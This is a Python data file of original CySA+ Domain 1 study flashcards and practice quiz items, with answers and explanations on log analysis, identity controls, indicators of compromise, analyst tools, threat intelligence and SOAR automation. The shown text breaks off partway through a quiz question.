"""CySA+ Domain 1 drill content — objectives 1.1 to 1.5.

Original prose written against CompTIA's published CS0-003 objectives
(build/cysa-spine.json). Class decks and transcripts are read for scope
only; no instructor wording or Knowledge Check questions are reproduced,
because the repo is public.

Shapes:
    FLASHCARDS  (objective, front, back)
    QUIZ        (objective, question, [4 choices], answer_index, explanation)
    SCENARIOS   (objective, situation, question, [4 choices], answer_index, explanation)

Recovered 2026-10-22 from the published page after the cloud workspace was
reclaimed; this file is now committed so that cannot recur.
"""

FLASHCARDS = [
 ("1.1", "Why does time synchronization matter before you ingest logs?",
  "Correlation depends on it. If three hosts disagree by minutes, the same intrusion appears as three unrelated events in the wrong order, and you cannot build a timeline. NTP across every log source is the precondition for everything a SIEM does."),
 ("1.1", "What does raising the logging level cost you?",
  "Volume. Debug-level logging on a busy service can bury the signal and fill storage or your ingest license. The analyst's job is picking a level that still records what an investigation needs — authentication, privilege use, process creation — without drowning it."),
 ("1.1", "Why is the Windows Registry interesting to an analyst?",
  "It holds persistence. Run keys, services, scheduled-task definitions and shell extensions all live there, so malware that wants to survive reboot usually writes to it. Registry changes are a named host indicator for exactly this reason."),
 ("1.1", "What is system hardening?",
  "Reducing attack surface below the default build: removing unused software and services, closing ports, tightening permissions and applying a secure baseline. The goal is fewer things running that could be abused."),
 ("1.1", "Why does an analyst need to know standard configuration file locations?",
  "Because that is where you look to confirm or disprove a theory quickly — /etc on Linux, the registry and ProgramData on Windows. Unexpected changes there are evidence; knowing the normal layout is what makes 'unexpected' meaningful."),
 ("1.1", "Serverless, virtualization and containerization — what changes for the analyst?",
  "What you can inspect, and for how long. A VM has a disk you can image. A container is usually ephemeral and rebuilt from an image, so forensics shifts to the image and the orchestration logs. Serverless gives you almost nothing to image — the provider's logs are the evidence."),
 ("1.1", "What does network segmentation buy you during an incident?",
  "Containment. It limits lateral movement, so a compromised host reaches fewer targets, and it gives you natural choke points where traffic between zones can be monitored and cut."),
 ("1.1", "State the zero trust assumption in one sentence.",
  "No implicit trust from network location: every request is authenticated and authorized on its own merits, whether it came from the data center or a coffee shop."),
 ("1.1", "What is SASE?",
  "Secure Access Service Edge — delivering network security controls from the cloud edge rather than from an appliance in your building, so a remote user gets the same inspection and policy without hairpinning traffic back through headquarters."),
 ("1.1", "What does SDN separate, and why does it matter?",
  "The control plane from the data plane. Forwarding decisions become software you can change centrally and programmatically, which means segmentation and isolation can be applied in seconds during an incident instead of by reconfiguring hardware."),
 ("1.1", "SSO and federation — what is the difference?",
  "SSO is one authentication serving many applications inside one trust domain. Federation extends that across organizational boundaries, so an identity provider in one organization can vouch for a user to a service provider in another."),
 ("1.1", "What problem does PAM exist to solve?",
  "Standing administrative privilege. Privileged access management vaults the credentials and hands them out just in time, for a bounded session, with recording — so the powerful account is not simply sitting in someone's password manager permanently."),
 ("1.1", "What does a CASB sit between, and what does it do there?",
  "Between your users and cloud services. It gives visibility into which services are being used, enforces policy on them, and can spot data leaving to unsanctioned applications — the shadow IT problem."),
 ("1.1", "Why does SSL/TLS inspection exist, and what is the trade-off?",
  "Encrypted traffic hides both legitimate privacy and malicious payloads; inspection decrypts at a proxy so content can be examined. The trade-off is a decryption point that sees everything, plus privacy, performance and certificate-pinning breakage."),
 ("1.1", "PII versus CHD — why distinguish them?",
  "Different obligations. PII is personal data under privacy law; cardholder data falls under PCI DSS, which prescribes specific storage, transmission and handling rules. Which one is involved changes both the response and the reporting."),
 ("1.2", "What is beaconing, and what makes it recognisable?",
  "A compromised host checking in with its controller on a regular interval. The giveaway is regularity — small, repeated outbound connections at a near-constant cadence, often to the same destination, continuing regardless of whether a user is active."),
 ("1.2", "Why is irregular peer-to-peer traffic suspicious inside an enterprise?",
  "Because workstations normally talk to servers, not to each other. Workstation-to-workstation traffic suggests lateral movement, worm propagation, or a tool distributing itself across the subnet."),
 ("1.2", "What are scans and sweeps, as indicators?",
  "Reconnaissance. A sweep looks for live hosts across a range of addresses; a scan probes ports or services on a host. Seen from inside, they usually mean an attacker already has a foothold and is mapping what else is reachable."),
 ("1.2", "Activity on unexpected ports — why does it matter more than the port number itself?",
  "Because the signal is the deviation from baseline, not the port. A database answering on a high ephemeral port, or outbound traffic on 4444, matters because it is not what that host normally does."),
 ("1.2", "Give the three host resource indicators and what each can suggest.",
  "Processor consumption — cryptomining or brute-force work. Memory consumption — injected code or a leaking implant. Drive capacity consumption — data being staged for exfiltration, or logs being flooded to force rotation."),
 ("1.2", "What is abnormal OS process behavior?",
  "A known-good process doing something out of character: a browser spawning a command shell, a word processor making outbound network connections, a signed binary loading an unsigned DLL. The process name is legitimate; its behavior is not."),
 ("1.2", "Why are unauthorized scheduled tasks a strong indicator?",
  "They are a persistence mechanism that survives reboot and runs with whatever privilege was configured. A task nobody can account for, especially one running a script from a user-writable path, is very hard to explain innocently."),
 ("1.2", "What does 'introduction of new accounts' tell you?",
  "Either persistence or privilege. An attacker who can create an account no longer needs the original foothold, and an account added directly to a privileged group bypasses whatever approval process normally governs that."),
 ("1.2", "Unexpected output — what does that mean in practice?",
  "An application returning something it should not: database errors revealing structure, a web page echoing injected content, a response far larger than the request warrants. It suggests the application is being manipulated rather than used."),
 ("1.2", "What are obfuscated links, and why do they work?",
  "URLs disguised so the destination is not obvious — shorteners, lookalike characters, encoded paths, misleading display text over a different href. They work because people read the visible label and act on it, not the underlying address."),
 ("1.3", "When do you reach for a packet capture rather than logs?",
  "When you need the content, not the summary. Logs tell you a connection happened; a capture shows what crossed it. Use it to confirm exfiltration, extract a payload, or prove what a protocol actually carried."),
 ("1.3", "Wireshark or tcpdump — what decides?",
  "Where you are. tcpdump is command line, light, ideal on a server or over SSH and for scripted captures. Wireshark gives you dissection, following streams and filtering interactively — better for analysis, heavier to run."),
 ("1.3", "What does a SIEM actually do for you?",
  "Centralizes logs from many sources, normalizes them into comparable fields, and correlates across them so a sequence that looks harmless on each host alone can raise one alert when seen together."),
 ("1.3", "Where does SOAR add value over a SIEM?",
  "After the alert. SOAR runs the response — enrich the indicator, check it against threat intelligence, isolate the host, open the ticket — as a repeatable playbook rather than an analyst repeating the same ten steps by hand."),
 ("1.3", "What does EDR give you that antivirus does not?",
  "Behavior and history. It records process creation, network connections and file changes on the endpoint, so you can both detect activity that has no signature and reconstruct what happened after the fact — and respond, by isolating or killing."),
 ("1.3", "What are WHOIS and AbuseIPDB used for?",
  "Judging a domain or address you have observed. WHOIS gives registration detail — a domain registered three days ago is itself a signal. AbuseIPDB gives community-reported history for an IP. Both are reputation inputs, not verdicts."),
 ("1.3", "What is `strings` good for, and what is its limitation?",
  "Pulling readable text out of a binary — URLs, file paths, commands, error messages — for a fast read on what something might do, without running it. The limitation is that packed or encrypted samples reveal almost nothing this way."),
 ("1.3", "Why submit a hash to VirusTotal rather than the file?",
  "Because uploading the file can disclose it. A hash lookup tells you whether the sample is already known without publishing potentially sensitive content, and without tipping off an attacker who monitors for their own tooling appearing publicly."),
 ("1.3", "What does sandboxing give you, and how is it evaded?",
  "Detonation in isolation, so you can watch behavior safely — files written, processes spawned, connections attempted. Malware evades it by detecting the sandbox and staying dormant, or simply by waiting longer than the analysis window."),
 ("1.3", "SPF, DKIM and DMARC — what does each one actually check?",
  "SPF: was this message sent from a host the domain authorized? DKIM: does the signature prove the message was not altered and came from the domain? DMARC: given those results, what should the receiver do, and where should reports go?"),
 ("1.3", "What is impossible travel?",
  "Successful authentications from locations too far apart for the time between them. One of the two sessions is not the real user — it is credential theft, a proxy, or a session token being reused."),
 ("1.3", "Why are regular expressions worth knowing for this exam?",
  "Because log work is pattern work. Extracting every IPv4 address, every Base64 blob, or every PowerShell encoded command out of a mass of text is a regex job, and it is how filters and detections get written."),
 ("1.5", "Which tasks are the right candidates for automation?",
  "Repeatable ones that do not need judgment — enrichment lookups, ticket creation, pulling a host's process list, blocking a known-bad indicator. Anything requiring a decision about risk or context stays with a human."),
 ("1.5", "What does data enrichment mean in a SOAR workflow?",
  "Adding context to a bare indicator automatically before a human sees it: geolocation and reputation for an IP, registration age for a domain, prior sightings for a hash. The analyst then starts with a picture instead of a string."),
 ("1.5", "Why combine multiple threat feeds?",
  "Coverage and corroboration. No single feed sees everything, and an indicator appearing in several independent feeds carries more weight than one appearing in a single low-quality list."),
 ("1.5", "API, webhook, plugin — what distinguishes them?",
  "An API is a door you knock on when you want something. A webhook is the other direction — the other system calls you when an event happens, so you are not polling. A plugin extends a product from inside, using an integration point its vendor provided."),
 ("1.5", "What is 'single pane of glass', and what is the catch?",
  "One console presenting data from many tools, so analysts stop switching context and missing things between systems. The catch is that the aggregation layer can lose fidelity, and it becomes a single point of failure for visibility."),
 ("1.4", "What distinguishes an APT from other threat actors?",
  "Persistence and resourcing, not sophistication alone. An advanced persistent threat intends to stay — establishing long-term access, moving quietly, and returning after remediation — usually with state or organized backing behind it."),
 ("1.4", "Hacktivist, organized crime, nation-state, script kiddie — what separates them?",
  "Motivation and capability. Hacktivists want attention for a cause; organized crime wants money; nation-states want intelligence or disruption and can fund long campaigns; script kiddies use others' tools for status or curiosity."),
 ("1.4", "Intentional versus unintentional insider threat — why does the distinction matter?",
  "Because the control differs. Intentional insiders need detection, monitoring and least privilege; unintentional ones — the person who clicks, or copies a file to a personal drive — need training, guardrails and DLP. Treating them identically wastes effort on both."),
 ("1.4", "What is a supply chain threat?",
  "Compromise reaching you through something you trust: a vendor's software update, a managed service provider's access, a hardware component, a library your build pulls in. You inherit the security of everyone upstream of you."),
 ("1.4", "What does TTP stand for, and why is it the most useful layer to detect on?",
  "Tactics, techniques and procedures — how an actor operates. Hashes and IPs change cheaply; behavior is expensive to change, so detections built on TTPs survive longer."),
 ("1.4", "Timeliness, relevancy, accuracy — what are these?",
  "The three confidence dimensions for threat intelligence. Timeliness: is it still current? Relevancy: does it apply to your sector, technology and exposure? Accuracy: is it correct and corroborated? Intelligence failing any of the three can mislead rather than inform."),
 ("1.4", "Open source versus closed source intelligence — the trade-off?",
  "Open source is free and broad but noisier, slower and public, so adversaries read it too. Closed source — paid feeds, sharing organizations, your own internal telemetry — is more targeted and timelier, at a cost."),
 ("1.4", "What are CERT and CSIRT?",
  "Organized response teams that publish advisories and coordinate handling. A CERT is typically national or sector-wide; a CSIRT is an organization's own incident response team. Both are intelligence sources as well as responders."),
 ("1.4", "Why is your own internal telemetry a threat intelligence source?",
  "Because it is perfectly relevant by definition. What has already targeted your estate predicts what will target it next, and no external feed knows your environment as well as your own logs do."),
 ("1.4", "What are the three things you do with an indicator of compromise?",
  "Collect it, analyze it, apply it. Gathering indicators is pointless unless they are assessed for quality and relevance, and then actually deployed into detections and blocks."),
 ("1.4", "Name the three focus areas for threat hunting and what each is looking for.",
  "Configurations and misconfigurations — drift and weak settings an attacker would use. Isolated networks — segments nobody watches, where activity goes unnoticed. Business-critical assets and processes — where compromise would actually hurt."),
 ("1.4", "What is active defense, and where is its limit?",
  "Measures that raise the attacker's cost inside your own environment — deception, misdirection, making progress slow and noisy. The limit is your own perimeter: striking back at attacker infrastructure is not active defense, it is illegal in most jurisdictions."),
 ("1.4", "What is a honeypot for, and what is the tell-tale sign of value?",
  "A deliberately exposed system with no legitimate purpose, there to attract and observe attackers. Its value is signal purity — nobody has a legitimate reason to touch it, so any interaction is worth investigating."),
 ("1.4", "Who should threat intelligence be shared with inside the organization?",
  "Incident response, vulnerability management, risk management, security engineering, and detection and monitoring. Intelligence that reaches only the intel team changes nothing."),
 ("1.1", "Logs arrive from firewalls, Windows hosts and a web server in three different formats. What has to happen before correlation is possible?",
  "Parsing and normalization. Ingestion is not just collection — each source is broken into fields and rewritten into a common schema, so that \"source IP\" means the same thing everywhere. Without it you can store logs but you cannot search or correlate across them."),
 ("1.1", "Order the syslog severity levels from most to least severe.",
  "Emergency, Alert, Critical, Error, Warning, Notice, Informational, Debug — numbered 0 through 7. The number rises as severity falls, which is the trap: level 7 is the noisiest, not the most urgent. Setting a threshold of 4 keeps everything at Warning and above."),
 ("1.1", "Which Registry hive would you examine for local accounts, group membership and access control settings?",
  "SECURITY. It holds the local security policy — accounts, group assignments and rights — so it answers \"who could do this\" during an investigation. SYSTEM and SOFTWARE carry device and application configuration instead."),
 ("1.1", "Linux has no Registry. Where does the equivalent configuration live?",
  "In files, mostly under /etc. The design principle is that everything is a file, so configuration is readable text rather than a binary database. That makes it easy to diff, version and inspect — and easy for an attacker to modify without special tooling."),
 ("1.1", "Name what you would expect to find in /etc, /var, /proc and /home.",
  "/etc holds system configuration, /var holds variable data including logs, /proc exposes running process and kernel state as a virtual filesystem, /home holds user data. Knowing these is what lets you go straight to the right place instead of searching a whole disk."),
 ("1.1", "Where are authentication events recorded on a Debian or Ubuntu system, and where on Windows?",
  "On Debian-family Linux, /var/log/auth.log. On Windows, the Security log in Event Viewer. Both answer the same question — who authenticated, when, and whether it succeeded — which is usually the first thing you want in an intrusion."),
 ("1.1", "Why does an analyst care about system processes?",
  "Because the process list is where malicious code has to appear in order to run. Knowing what normally runs, under which account, and with which parent, is what makes an anomaly visible. A legitimate-looking name running from the wrong path or the wrong parent is a classic finding."),
 ("1.1", "Which commands list running processes on Linux and on Windows?",
  "Linux: ps for a snapshot, top for a live view. Windows: Task Manager, or tasklist from the command line. The skill being tested is knowing the native tool on each platform, because that is what is available on a host you have just been handed."),
 ("1.1", "How does virtualization differ from containerization?",
  "Virtualization runs several complete operating systems on one physical host, each with its own kernel. Containerization packages an application with its dependencies and shares the host kernel between containers. Containers are lighter and start faster; virtual machines isolate more completely."),
 ("1.1", "Why is a shared kernel the key security consideration for containers?",
  "Because it is the one boundary that is not duplicated. Containers are isolated from each other, but they all sit on the same kernel, so a kernel-level escape affects every container on the host. Virtual machines do not share that surface."),
 ("1.1", "What additional risk does a hybrid environment carry that neither pure on-premises nor pure cloud does?",
  "The seams. The individual security problems are familiar, but hybrid adds overlapping and duplicated processes — two identity systems, two logging pipelines, two sets of controls — and gaps open where responsibility is ambiguous rather than inside either environment."),
 ("1.1", "Why is an SDN segment considered a stronger boundary than a VLAN?",
  "Because SDN enforces segmentation centrally in software, as policy, rather than relying on switch configuration that can be bypassed by hopping or misconfiguration. It also extends into cloud networks, which VLANs do not, so the boundary stays intact across environments."),
 ("1.1", "What are the three authentication factor categories, and what makes a second factor genuinely a second factor?",
  "Something you know, something you have, something you are. Two credentials from the same category are not multifactor — a password plus a security question is still one factor. The point is that compromising one category does not compromise the other."),
 ("1.1", "What does passwordless authentication change about the threat model?",
  "It removes the shared secret. With nothing to phish, reuse or crack, credential stuffing and password spraying stop working, and password resets largely disappear. The risk moves to the device or biometric holding the credential, so losing that device becomes the thing to plan for."),
 ("1.1", "What does a PKI actually provide?",
  "A trust framework. It issues, distributes, renews and revokes certificates through a hierarchy of certificate authorities, so that two parties who have never met can verify each other and exchange keys. The private key never travels; trust flows from the root CA downward."),
 ("1.1", "Why does certificate revocation matter, and how is it checked?",
  "Because a certificate is valid until its expiry date regardless of whether the key behind it has been stolen. Revocation is the mechanism for saying \"stop trusting this one now\", published through a CRL or queried per-certificate with OCSP. Without a revocation check, a compromised certificate keeps working."),
 ("1.1", "What is DLP for, and where does it inspect?",
  "Preventing sensitive data leaving the organization. It identifies regulated or classified content by pattern and context, then blocks, quarantines or alerts — at the endpoint, on the network egress, and in cloud applications, which is one reason DLP is commonly delivered through a CASB."),
 ("1.1", "Which regulations typically drive protection of PII and CHD respectively?",
  "PII is governed by privacy law such as GDPR, and the obligation follows the individual. CHD is governed by PCI DSS, a contractual standard imposed by the card brands. The distinction matters because it changes who enforces it, what the penalties are, and how long you may retain the data."),
 ("1.5", "Orchestration and automation are not synonyms. What does each one actually do?",
  "Automation executes a task without human intervention. Orchestration coordinates and sequences tasks across different tools so they act as one workflow. You can automate a single step without orchestrating anything; orchestration is what turns a set of automated steps into a response."),
 ("1.5", "What disqualifies a task from automation?",
  "Needing judgment. Repeatable work with a predictable input and a defined outcome automates well. Anything requiring interpretation, weighing of context or a decision someone must own does not — and automating it does not remove the judgment, it just removes the person making it."),
 ("1.5", "Why does standardizing a process matter before automating it?",
  "Automation reproduces whatever it is given, at speed. Standardizing first means the thing being multiplied is consistent and correct; automating an ad-hoc process just produces inconsistent results faster, and across the whole organization instead of one analyst at a time."),
 ("1.5", "Name three things standardization buys a security team.",
  "Consistency, because the same situation gets the same response regardless of who is on shift. Fewer errors, because the steps are not reinvented under pressure. Demonstrable compliance, because a documented repeatable process is what an auditor can actually test against."),
 ("1.5", "Why must the security team be involved in automation decisions rather than leaving them to engineering?",
  "Because only the team that handles the incidents knows which steps are safe to take without a human, what a false positive costs, and where the judgment calls are. Automation built without that knowledge optimizes the wrong things and tends to automate exactly the steps that should not be."),
 ("1.5", "What is the real goal of minimizing human engagement?",
  "Reallocating attention, not removing people. Routine high-volume work consumes the analyst hours that complex investigation needs. Automating the repetitive layer is what makes expert time available for the problems that actually require expertise."),
 ("1.5", "What does a SOAR platform centralize?",
  "The response itself. Playbooks, the sequence of actions, the tool integrations and the record of what was done all live in one place, so incidents are handled the same way every time instead of according to whoever picked up the ticket."),
 ("1.5", "Why does the audit trail a SOAR platform produces matter beyond convenience?",
  "Because it records what was done, when, by which playbook, automatically. That is what post-incident review, regulatory reporting and any legal process need — and it is the part analysts working by hand under pressure reliably fail to write down."),
 ("1.5", "Give examples of actions a SOAR platform can trigger automatically on detection.",
  "Blocking an address at the firewall, isolating a host through the endpoint agent, disabling an account, updating an IDS rule, opening and populating a ticket. The value is containment at machine speed, during the window where a human has not yet read the alert."),
 ("1.5", "What does enriching an alert with MITRE ATT&CK context add?",
  "It names the technique rather than the artifact. Instead of an isolated indicator, the analyst sees which tactic it belongs to, what typically precedes and follows it, and therefore where to look next. The alert becomes a position in an attack sequence rather than a single data point."),
 ("1.5", "Where do threat feeds come from, and why does the mix matter?",
  "Commercial providers, open-source databases, and the organization's own internal data. Each has different coverage and different blind spots, so a single feed produces a confident but partial picture. Internal data is the one nobody else has, and often the most relevant."),
 ("1.5", "An API connects two tools and a plugin extends one. When would you reach for each?",
  "An API when two systems that already do their jobs need to exchange data or trigger each other. A plugin when one tool needs a capability it does not have. Connecting versus extending — reaching for the wrong one usually means building an integration where a module already exists, or the reverse."),
 ("1.5", "Which direction does a webhook push, and what does that save?",
  "The source pushes to you when the event happens, rather than you polling the source to ask. It removes the delay between the event and your knowing about it, and it removes the wasted calls that polling makes when nothing has changed."),
 ("1.5", "What is the failure mode of automating a step that needed judgment?",
  "It executes confidently on a wrong input. A containment action triggered by a false positive isolates a production host; an automated block on a bad indicator takes out a legitimate service. The error is not that it was automated but that nothing in the loop could recognize the case was unusual."),
 ("1.1", "Name the common passwordless methods.",
  "Biometrics such as fingerprint or face, a one-time code delivered to a registered device, and a hardware security key or passkey held on the device. All three prove possession or inherence rather than knowledge, which is why none of them can be phished the way a password can."),
 ("1.1", "What has to happen before DLP can enforce anything?",
  "Discovery and classification. The tool scans file servers, databases and repositories to find sensitive data and tag it. Policy can only act on data it can recognize, so an organization that has never classified its data gets alerts on patterns and misses everything else."),
 ("1.1", "DLP covers data in three states. Name them and give an example control for each.",
  "In motion — blocking card numbers leaving over email or upload. At rest — finding and quarantining sensitive files sitting on an open share. In use — stopping a copy to removable media or a screenshot at the endpoint. Covering only traffic leaves the other two states unguarded."),
 ("1.1", "Besides catching inbound malware, what else does SSL inspection make visible?",
  "Data leaving. An insider or a foothold exfiltrating over HTTPS looks like ordinary encrypted traffic to a firewall, so without inspection the egress channel is unmonitored. The same decryption point that finds hidden malware is what makes outbound data loss detectable."),
 ("1.1", "What does SDN enable beyond central control of forwarding?",
  "Access decisions that respond to context — identity, device type, location — rather than to a port or a subnet. Because policy is software, it can be rewritten and pushed in minutes when a threat appears, which is the practical difference from hardware-defined segmentation."),
]

QUIZ = [
 ("1.1", "Three servers log the same failed-login burst, but your SIEM shows them 4, 7 and 11 minutes apart. What is the first thing to fix?",
  ["Raise the logging level on all three", "Synchronize the hosts to a common time source", "Add a correlation rule with a wider window", "Re-ingest the logs with a new parser"], 1,
  "Without a common clock the timeline is fiction, and every correlation rule built on it inherits the error. Widening the window hides the problem rather than fixing it."),
 ("1.1", "Which best describes the security value of network segmentation during an active incident?",
  ["It encrypts traffic between zones", "It limits lateral movement and gives you choke points", "It removes the need for host firewalls", "It guarantees compromised hosts cannot reach the internet"], 1,
  "Segmentation constrains how far a foothold spreads and creates natural places to monitor and cut traffic. It is not encryption, and it does not by itself control egress."),
 ("1.1", "A user authenticates once in the morning and reaches a dozen internal applications with no further prompts, all within your own organization. This is:",
  ["Federation", "Single sign-on", "Privileged access management", "Passwordless authentication"], 1,
  "One authentication serving many applications inside one trust domain is SSO. Federation is the same idea extended across organizational boundaries."),
 ("1.1", "What distinguishes privileged access management from ordinary account management?",
  ["It stores passwords in an encrypted database", "It issues elevated access just in time, for a bounded session, with recording", "It requires multifactor authentication on every login", "It applies only to service accounts"], 1,
  "PAM's point is removing standing privilege. A vault alone is not PAM; the just-in-time, time-bounded, monitored session is."),
 ("1.1", "Your organization wants visibility into which cloud services staff are actually using, including ones IT never approved. Which control is designed for that?",
  ["DLP", "CASB", "SASE", "PKI"], 1,
  "A cloud access security broker sits between users and cloud services, which is what gives it the shadow-IT view and the ability to enforce policy there."),
 ("1.1", "A containerized workload is compromised and the container is destroyed and rebuilt within seconds. What does this mean for your investigation?",
  ["Nothing — container forensics is identical to VM forensics", "Evidence on the container is likely gone; shift to the image and orchestration logs", "The incident can be closed, since the rebuild removed the threat", "You must image the host's physical disk before anything else"], 1,
  "Ephemerality is the defining forensic problem with containers. The durable artifacts are the image it was built from and the orchestration platform's logs."),
 ("1.2", "An internal host makes a 2 KB outbound connection to the same external address every 60 seconds, day and night, regardless of whether anyone is logged in. This is best described as:",
  ["A scan", "Beaconing", "Data exfiltration", "Impossible travel"], 1,
  "Small, regular, persistent check-ins to a fixed destination are the classic beaconing pattern. Exfiltration would normally move far more data; a scan would touch many destinations."),
 ("1.2", "Which observation most strongly suggests lateral movement rather than normal operation?",
  ["A workstation downloading a large file from a file server", "Workstations connecting directly to other workstations on SMB", "A spike in DNS queries from the mail server", "A server consuming more memory after a software update"], 1,
  "Workstations normally talk to servers, not to each other. Peer-to-peer traffic between endpoints is a hallmark of an attacker moving sideways or a worm spreading."),
 ("1.2", "A signed, legitimate word processor spawns a command shell, which then makes an outbound connection. The correct way to characterize this is:",
  ["Unauthorized software", "Abnormal OS process behavior", "A rogue device", "Service interruption"], 1,
  "The binary is legitimate and nothing unauthorized was installed. What is wrong is the behavior — a process acting out of character, which is precisely the indicator in question."),
 ("1.2", "Which of these is the strongest single indicator that an attacker has established persistence?",
  ["High processor consumption overnight", "A scheduled task nobody can account for running a script from a user-writable directory", "A spike in inbound traffic to the web server", "An application returning a database error to a user"], 1,
  "A scheduled task survives reboot and runs with configured privilege. Unexplained, pointing at a user-writable path, it is very hard to explain innocently."),
 ("1.2", "A finance workstation's free disk space drops by 40 GB over two hours, with no software installed. The most likely explanation an analyst should test first is:",
  ["A failing disk reporting incorrectly", "Data being staged locally before exfiltration", "A Windows update downloading", "Normal temporary file growth"], 1,
  "Staging — collecting and often compressing data before moving it out — shows up exactly like this. The other explanations are worth excluding, but staging is the one with security consequences."),
 ("1.3", "You need to prove what was actually carried over a connection, not merely that it happened. Which do you reach for?",
  ["SIEM correlation rules", "A packet capture", "NetFlow records", "Endpoint process logs"], 1,
  "Flow records and logs establish that a conversation occurred and its volume. Only full capture shows the content."),
 ("1.3", "What is the clearest division of labor between SIEM and SOAR?",
  ["SIEM collects and correlates; SOAR executes the response", "SIEM is cloud-based; SOAR is on-premises", "SIEM handles endpoints; SOAR handles the network", "They are different names for the same capability"], 0,
  "SIEM is detection through aggregation and correlation. SOAR is the orchestrated response that follows, run as a repeatable playbook."),
 ("1.3", "An analyst wants a quick read on what an unfamiliar binary might do, without executing it. The appropriate first step is:",
  ["Detonate it in a sandbox", "Run `strings` against it", "Submit the file to a public scanner", "Check the host's EDR timeline"], 1,
  "`strings` is the fast, non-executing look at embedded URLs, paths and commands. Sandboxing is the next step when that is inconclusive, and uploading the file itself has disclosure consequences."),
 ("1.3", "Why would an analyst submit a file's hash to a reputation service rather than the file?",
  ["Hashes return results faster", "Uploading the file may disclose sensitive content and can alert the attacker", "Hash lookups are more accurate than file analysis", "File uploads are blocked by most SIEMs"], 1,
  "The hash answers 'is this already known' without publishing the content, and without an attacker monitoring for their tooling seeing it appear."),
 ("1.3", "A message passes SPF but fails DKIM. What does that combination tell you?",
  ["The sending host was authorized, but the message content or signature does not validate", "The message definitely came from a spoofed domain", "The recipient's mail server is misconfigured", "DMARC will always allow the message"], 0,
  "SPF validates the sending host; DKIM validates integrity and origin via signature. Passing one and failing the other commonly means the message was altered in transit or signed incorrectly — and DMARC decides what to do with that."),
 ("1.3", "A user account authenticates successfully from Chicago at 09:14 and from Singapore at 09:41. The named indicator is:",
  ["Beaconing", "Impossible travel", "Irregular peer-to-peer communication", "Unauthorized privileges"], 1,
  "No one covers that distance in 27 minutes. One of the two sessions is not the legitimate user — stolen credentials, a proxy, or a replayed session token."),
 ("1.3", "You must extract every Base64-encoded PowerShell command from 40 GB of logs. The right tool for the job is:",
  ["A regular expression", "A packet capture filter", "A sandbox", "A WHOIS lookup"], 0,
  "Pattern extraction across bulk text is exactly what regular expressions are for, and it is how detections and filters get written in the first place."),
 ("1.5", "Which task is the best candidate for automation in a SOC?",
  ["Deciding whether an incident warrants customer notification", "Enriching an IP address with geolocation and reputation data", "Judging whether a vulnerability is an acceptable risk", "Approving a firewall change in a production environment"], 1,
  "Enrichment is repeatable and needs no judgment. The other three all require a decision about risk or consequence and belong with a human."),
 ("1.5", "What distinguishes a webhook from an API call?",
  ["A webhook is encrypted; an API call is not", "The webhook is pushed to you when an event occurs, rather than you polling for it", "Webhooks work only between cloud services", "An API call cannot carry a payload"], 1,
  "Direction is the distinction. You call an API when you want something; a webhook calls you when something happens, which removes polling."),
 ("1.5", "Your SOC pulls four threat feeds instead of one. The strongest justification is:",
  ["Vendor redundancy in case one feed is offline", "Broader coverage, plus corroboration when an indicator appears in several independent feeds", "It reduces the cost per indicator", "It removes the need for analyst review"], 1,
  "No feed sees everything, and independent corroboration raises confidence in an indicator. It certainly does not remove the need for review."),
 ("1.4", "A campaign against your sector has used four different malware families and changed infrastructure weekly, but the same sequence of living-off-the-land commands appears every time. Where should your detection effort go?",
  ["Blocking the observed file hashes", "Detecting the command sequence as a TTP", "Blacklisting the current IP ranges", "Signature updates from the antivirus vendor"], 1,
  "Hashes and infrastructure are cheap for an attacker to rotate — and this one clearly is rotating them. The behavior that stays constant is the durable detection."),
 ("1.4", "A feed reports an indicator that is accurate and current, but relates to industrial control systems your organization does not operate. Which confidence dimension does it fail?",
  ["Timeliness", "Relevancy", "Accuracy", "Corroboration"], 1,
  "It is correct and current, so timeliness and accuracy hold. It simply does not apply to your environment, which is relevancy — and acting on it would spend effort for no risk reduction."),
 ("1.4", "An employee emails a customer list to a personal account to work on at home over a weekend. The most accurate classification is:",
  ["Intentional insider threat", "Unintentional insider threat", "Organized crime", "Supply chain threat"], 1,
  "There is no malicious intent, but the data has left controlled storage. The remedy is training, guardrails and DLP rather than the investigation an intentional insider warrants."),
 ("1.4", "Your organization deploys a honeypot on an internal segment. Three weeks later it records a single SMB connection from a finance workstation. How should this be treated?",
  ["Ignored — a honeypot generates noise by design", "Investigated immediately; nothing legitimate has reason to touch it", "Logged for the monthly report", "Treated as a scanner false positive"], 1,
  "Signal purity is the whole point of a honeypot. One interaction from an internal workstation is a high-confidence indicator, not background noise."),
 ("1.4", "Which of these is active defense, as the objectives use the term?",
  ["Scanning the attacker's infrastructure for vulnerabilities", "Deploying deception technology to slow and expose an intruder inside your network", "Reporting the attacker's IP to their hosting provider", "Taking the attacker's command server offline"], 1,
  "Active defense raises the attacker's cost inside your own environment. Acting against their infrastructure is outside your perimeter and generally unlawful."),
 ("1.1", "Your SIEM is configured to capture severity level 4 and above. Which events will it record?",
  ["Debug and Informational only", "Warning, Error, Critical, Alert and Emergency", "Everything, since 4 is the midpoint", "Notice, Informational and Debug"], 1,
  "Syslog numbers severity in reverse: 0 is Emergency and 7 is Debug, so \"4 and above\" in severity terms means level 4 down to level 0 — Warning through Emergency. Reading the numbers as increasing severity is the mistake this tests."),
 ("1.1", "A host is handed to you with a suspected foothold. Which observation most strongly suggests a malicious process rather than a normal one?",
  ["It is consuming a high percentage of CPU", "A system-sounding executable is running from a user-writable directory", "It was started after the most recent reboot", "It has an unfamiliar name"], 1,
  "Legitimate system binaries run from protected system paths. The same name running out of a user profile directory is a strong indicator, because an attacker can write there without privilege. High CPU, recent start and unfamiliar names all have ordinary explanations."),
 ("1.1", "A container is compromised. Which concern is specific to containerization rather than virtualization?",
  ["The workload can be rebuilt from an image", "A kernel-level escape would affect every container on that host", "The filesystem is isolated from other workloads", "Network traffic can be segmented"], 1,
  "Containers share the host kernel; virtual machines each run their own. That shared kernel is the boundary a container escape attacks, and it is the one risk that does not transfer to a VM-based design."),
 ("1.1", "An organization wants users to sign in once and reach applications belonging to a partner company. What does this require?",
  ["Single sign-on", "Federation", "Privileged access management", "Multifactor authentication"], 1,
  "SSO covers applications within one trust domain. Reaching another organization's applications requires federation, which establishes trust between separate identity providers. The two are routinely confused, and the distinguishing word is \"across organizations\"."),
 ("1.1", "A user authenticates with a password and then answers a security question. Is this multifactor?",
  ["Yes, two credentials were presented", "No, both are things the user knows", "Yes, provided the question is sufficiently obscure", "Only if the two are checked by different systems"], 1,
  "Multifactor requires credentials from different categories — know, have, are. A password and a security question are both knowledge, so a single phishing attack or breach can capture both. Counting credentials rather than categories is the error."),
 ("1.1", "Why is SSL/TLS inspection deployed despite breaking end-to-end encryption?",
